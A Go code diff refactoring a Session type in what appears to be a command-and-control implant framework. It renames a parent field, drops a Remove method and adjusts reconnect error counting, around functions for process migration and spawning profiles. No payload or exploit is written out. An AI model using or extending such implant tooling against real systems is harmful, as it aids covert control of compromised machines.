@@ -139,7 +139,7 @@ func (s *Session) wait() {
 //
 // This is not valid for Server side Sessions.
 func (s *Session) Wake() {
-	if s.wake == nil || s.parent != nil || s.state.WakeClosed() {
+	if s.wake == nil || s.s != nil || s.state.WakeClosed() {
 		return
 	}
 	select {
@@ -147,17 +147,8 @@ func (s *Session) Wake() {
 	default:
 	}
 }
-
-// Remove will instruct the parent Listener remove itself. This has no effect if
-// the Session is a client Session.
-func (s *Session) Remove() {
-	if s.parent == nil {
-		return
-	}
-	s.parent.Remove(s.ID)
-}
 func (s *Session) listen() {
-	if _ = s.proxyState; s.parent != nil {
+	if _ = s.proxyState; s.s != nil {
 		// NOTE(dij): Server side sessions shouldn't be running this, bail.
 		return
 	}
@@ -208,7 +199,9 @@ func (s *Session) listen() {
 			h, s.w, s.t = s.p.Next()
 			s.host.Set(h)
 			// NOTE(dij): Reset the error count if we switch.
-			s.errors = 0
+			// NOTE(dij): Actually, let's decrement it, as a random or round
+			//            robin profile would leave us here forever!
+			s.errors--
 		}
 		c, err := s.p.Connect(s.ctx, s.host.String())
 		s.host.Wrap()
@@ -273,8 +266,8 @@ func (s *Session) shutdown() {
 	if s.tick != nil {
 		s.tick.Stop()
 	}
-	if s.state.Set(stateClosed); s.parent != nil {
-		s.parent.tryRemove(s)
+	if s.state.Set(stateClosed); s.s != nil {
+		s.s.Remove(s.ID, false)
 	}
 	s.m.close()
 	if s.lock.Unlock(); s.isMoving() {
@@ -311,7 +304,7 @@ func (s *Session) Close() error {
 	s.state.Unset(stateChannelValue)
 	s.state.Unset(stateChannelUpdated)
 	s.state.Unset(stateChannel)
-	if s.state.Set(stateClosing); s.parent != nil {
+	if s.state.Set(stateClosing); s.s != nil {
 		s.shutdown()
 		return nil
 	}
@@ -663,7 +656,7 @@ func (s *Session) pick(i bool) *com.Packet {
 		return <-s.send
 	}
 	switch {
-	case s.parent != nil && s.state.Channel():
+	case s.s != nil && s.state.Channel():
 		select {
 		case <-s.wake:
 			return nil
@@ -1058,7 +1051,7 @@ func (s *Session) Migrate(wait bool, n string, job uint16, r runnable) (uint32, 
 // The return values for this function are the new PID used and any errors that
 // may have occurred during the Spawn.
 func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) (uint32, error) {
-	if s.parent != nil {
+	if s.s != nil {
 		return 0, xerr.Sub("must be a client session", 0x5)
 	}
 	if s.isMoving() {
@@ -1144,7 +1137,7 @@ func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) 
 // The return values for this function are the new PID used and any errors that
 // may have occurred during Migration.
 func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t time.Duration, e runnable) (uint32, error) {
-	if s.parent != nil {
+	if s.s != nil {
 		return 0, xerr.Sub("must be a client session", 0x5)
 	}
 	if s.isMoving() {
